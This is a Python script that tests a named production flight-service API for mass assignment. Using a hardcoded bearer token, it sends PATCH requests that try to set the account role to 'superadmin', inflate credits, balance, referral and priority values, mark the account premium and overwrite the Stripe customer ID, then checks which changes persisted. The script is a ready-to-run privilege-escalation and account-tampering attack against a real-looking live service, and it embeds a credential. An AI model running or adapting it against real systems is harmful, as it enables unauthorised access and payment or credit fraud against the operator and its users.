#!/usr/bin/env python3
"""
VERIFY FIELD PERSISTENCE AFTER MANIPULATION
==========================================
Check if manipulated fields actually persist in the user profile
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://vauntapi.flyvaunt.com"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

def req(method, endpoint, data=None):
    headers = {
        "Authorization": f"Bearer {JWT_TOKEN}",
        "Content-Type": "application/json"
    }
    url = f"{BASE_URL}{endpoint}"

    if method == "GET":
        resp = requests.get(url, headers=headers, timeout=10)
    elif method == "PATCH":
        resp = requests.patch(url, headers=headers, json=data, timeout=10)

    return resp.status_code, resp.json()

print("="*80)
print("FIELD PERSISTENCE VERIFICATION TEST")
print("="*80)

# Test 1: Get baseline
print("\n1. Getting baseline user data...")
status, before = req("GET", "/v1/user/")
print(f"Status: {status}")
print(f"Current fields: {list(before.keys())}")

# Check for our test fields
test_fields = ["credits", "balance", "referralCount", "role", "isAdmin",
               "isPremium", "flightCredits", "subscriptionTier", "membership"]

print(f"\nChecking for previously injected fields:")
for field in test_fields:
    if field in before:
        print(f"  ✓ {field}: {before[field]}")
    else:
        print(f"  ✗ {field}: NOT PRESENT")

# Test 2: Inject a unique test value
print("\n2. Injecting unique test value...")
test_payload = {
    "testFieldUnique123": "INJECTED_VALUE_" + str(datetime.now().timestamp()),
    "credits": 88888,
    "balance": 77777,
    "role": "superadmin",
    "isPremium": True
}

status, patch_response = req("PATCH", "/v1/user", test_payload)
print(f"PATCH Status: {status}")
print(f"PATCH Response keys: {list(patch_response.keys())}")

# Test 3: Verify immediately after
print("\n3. Verifying immediately after PATCH...")
status, after = req("GET", "/v1/user/")
print(f"GET Status: {status}")

print(f"\nChecking if injected fields persist:")
for field, value in test_payload.items():
    if field in after:
        actual_value = after[field]
        if actual_value == value:
            print(f"  🔴 CRITICAL: {field} = {actual_value} (PERSISTED!)")
        else:
            print(f"  ⚠️  {field} exists but value differs: {actual_value} != {value}")
    else:
        print(f"  ✓ {field}: NOT persisted (filtered by API)")

# Test 4: Check what actually changed
print("\n4. Comparing before and after:")
before_keys = set(before.keys())
after_keys = set(after.keys())

new_keys = after_keys - before_keys
if new_keys:
    print(f"  🔴 NEW FIELDS ADDED: {new_keys}")
else:
    print(f"  ✓ No new fields added")

changed_fields = []
for key in before_keys & after_keys:
    if before[key] != after[key]:
        changed_fields.append(key)
        print(f"  Changed: {key}")
        print(f"    Before: {before[key]}")
        print(f"    After:  {after[key]}")

if not changed_fields:
    print(f"  ✓ Only updatedAt changed (expected)")

# Test 5: Try to manipulate existing sensitive fields
print("\n5. Attempting to manipulate existing sensitive fields...")
sensitive_tests = [
    {"successfulReferralCount": 9999},
    {"priorityScore": 999999999},
    {"hasStripePaymentDetails": True},
    {"stripeCustomerId": "cus_HACKED"},
]

for payload in sensitive_tests:
    field = list(payload.keys())[0]
    original_value = before.get(field)

    status, patch_resp = req("PATCH", "/v1/user", payload)
    status2, verify = req("GET", "/v1/user/")

    new_value = verify.get(field)

    if new_value != original_value:
        print(f"  🔴 CRITICAL: {field} changed from {original_value} to {new_value}")
    else:
        print(f"  ✓ {field}: Protected (unchanged)")

print("\n" + "="*80)
print("FINAL VERDICT:")
print("="*80)

if new_keys or len(changed_fields) > 1:
    print("🔴 VULNERABILITY CONFIRMED: User field manipulation possible!")
    print(f"   - New fields can be added: {bool(new_keys)}")
    print(f"   - Existing fields can be changed: {len(changed_fields) > 1}")
else:
    print("✓ False positive: API accepts requests but doesn't persist malicious fields")
